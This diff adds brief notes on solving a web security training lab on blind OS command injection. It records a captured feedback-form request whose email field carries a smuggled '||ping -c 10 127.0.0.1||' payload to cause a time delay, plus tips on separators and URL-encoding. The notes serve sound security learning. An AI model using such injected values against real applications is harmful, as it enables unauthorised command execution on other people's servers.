@@ -1,0 +1,22 @@
+Lab: Blind OS command injection with time delays
+
+ This lab contains a blind OS command injection vulnerability in the feedback function.
+
+The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.
+
+To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay. 
+
+
+POST /feedback/submit HTTP/2
+
+
+csrf=4IsnAKckpwHaAn9CNb9h7pS7jbzPOyNY&name=test&email=test%40test.ca&subject=tewrw&message=rwerwerwerwerw
+
+ping -c 10 127.0.0.1
+
+
+csrf=4IsnAKckpwHaAn9CNb9h7pS7jbzPOyNY&name=testz&email=test%40test.ca||ping+-c+10+127.0.0.1||&subject=tewrw&message=rwerwerwerwerw
+
+using || or & with crtl u
+
+better ||
